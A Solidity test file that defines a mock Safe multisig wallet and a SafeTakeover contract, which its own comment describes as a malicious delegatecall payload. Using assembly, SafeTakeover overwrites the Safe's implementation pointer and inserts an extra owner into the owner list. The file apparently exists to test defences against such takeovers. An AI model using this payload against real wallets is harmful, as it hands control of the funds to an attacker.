// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/// @notice Minimal Safe stand-in with Safe v1.3 / v1.4's storage layout for slots 0–5. Owners execute directly
///         (Safe's `msg.sender == owner` signature path, reduced to a check). Test-only.
contract MockSafe {
    address internal constant SENTINEL = address(0x1);

    address internal singleton; // slot 0
    mapping(address => address) internal modules; // slot 1
    mapping(address => address) internal owners; // slot 2
    uint256 internal ownerCount; // slot 3
    uint256 internal threshold; // slot 4
    uint256 public nonce; // slot 5

    constructor(address owner, address singleton_) {
        singleton = singleton_;
        owners[SENTINEL] = owner;
        owners[owner] = SENTINEL;
        ownerCount = 1;
        threshold = 1;
    }

    /// @param operation 0 = call, 1 = delegatecall (as in Safe's `Enum.Operation`).
    function execTransaction(address to, uint256 value, bytes calldata data, uint8 operation) external payable {
        require(isOwner(msg.sender), "not an owner");
        nonce++;
        bool ok;
        if (operation == 1) (ok,) = to.delegatecall(data);
        else (ok,) = to.call{value: value}(data);
        require(ok, "execution failed");
    }

    function isOwner(address account) public view returns (bool) {
        return account != SENTINEL && owners[account] != address(0);
    }

    function getSingleton() external view returns (address) {
        return singleton;
    }

    receive() external payable {}
}

/// @notice Delegatecalled by a Safe: rewrites the Safe's own storage. What a malicious "multisend" payload does.
contract SafeTakeover {
    function swapSingleton(address newSingleton) external {
        assembly {
            sstore(0, newSingleton)
        }
    }

    /// @dev Inserts `owner` at the head of Safe's owners linked list (slot 2), without touching slot 0.
    function addOwner(address owner) external {
        assembly {
            mstore(0x00, 1) // SENTINEL
            mstore(0x20, 2)
            let headSlot := keccak256(0x00, 0x40)
            let head := sload(headSlot)
            mstore(0x00, owner)
            sstore(keccak256(0x00, 0x40), head)
            sstore(headSlot, owner)
            sstore(3, add(sload(3), 1))
        }
    }
}
